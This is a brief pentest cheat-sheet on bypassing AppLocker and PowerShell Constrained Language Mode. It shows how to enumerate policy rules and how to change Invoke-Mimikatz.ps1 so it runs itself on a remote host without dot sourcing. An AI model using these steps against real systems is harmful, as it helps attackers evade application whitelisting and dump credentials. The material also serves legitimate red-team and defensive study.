# Bypassing AppLocker
If you get errors when running powershell commands relating to language modes, this will be due to AppLocker running in Constrained Language Mode.

There may be elements within the AppLocker policy that show weak spots and these can be used to bypass it.

 - Enumerate the AppLocker policy
`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
 - Look for sections that state the Action = Allow and the PathConditions surrounding this policy.
 - Conversely look for paths that might be blocked, which might highlight areas that are inherently allowed.

e.g.
```
PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}

PublisherExceptions : {}

PathExceptions      : {}

HashExceptions      : {}

Id                  : 5a9340f3-f6a7-4892-84ac-0fffd51d9584

```

You may also run into difficulties loading modules with dot sourcing with AppLocker in play.
e.g.
`. .\Invoke-Mimikatz.ps1`

You can edit the ps1 module and add a line at the bottom to call itself.
e.g. open invoke-mimikatz.ps1, browse to the end of the file and add a line
`Invoke-Mimikatz`

Copy that script to the remote machine
`Copy-Item Invoke-Mimikatz-modified.ps1 \\<servername\path `
Now in a remote session on the machine you can load the module without using dot sourcing, effectively importing the module and running it in one go.
`.\Invoke-Mimikatz-modified.ps1`
